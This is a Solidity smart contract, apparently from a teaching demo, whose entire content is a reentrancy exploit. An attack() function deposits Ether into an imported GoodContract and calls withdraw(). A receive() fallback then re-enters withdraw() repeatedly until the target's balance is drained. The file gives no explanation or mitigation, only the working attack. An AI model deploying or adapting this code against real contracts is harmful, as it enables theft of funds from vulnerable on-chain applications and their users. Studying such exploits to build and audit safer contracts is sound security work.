// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

import "./GoodContract.sol";

contract BadContract {
    GoodContract public goodContract;

    constructor(address _goodContracAddress) {
        goodContract = GoodContract(_goodContracAddress);
    }

    // function to receive Ether
    receive() external payable {
        if (address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}
